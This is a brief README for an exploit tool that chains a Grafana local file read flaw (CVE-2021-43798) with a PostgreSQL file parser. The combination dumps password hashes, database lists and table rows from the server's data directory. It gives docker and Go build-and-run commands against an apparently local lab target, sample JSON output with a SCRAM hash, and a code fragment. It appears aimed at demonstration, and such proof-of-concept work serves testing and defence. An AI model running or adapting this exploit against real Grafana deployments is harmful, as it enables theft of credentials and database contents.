# CVE-2021-43798 + pgread

Grafana LFI → Full PostgreSQL dump via `pgdump` library.

## Run

```bash
docker compose up -d
cd exploit && go build && ./exploit -target http://localhost:13000
```

## Output

```json
{
  "passwords": [{"rolename": "admin", "password": "SCRAM-SHA-256$..."}],
  "databases": [{"Name": "postgres"}, {"Name": "production"}],
  "control": {"state_string": "in production", "pg_version_major": 16},
  "dumps": [{"name": "users", "rows": [...]}]
}
```

## Code

```go
lfi := NewLFIReader(target, "/var/lib/postgresql/data")
result := lfi.DumpAll()  // Uses pgdump.DumpDatabaseFromFiles()
```
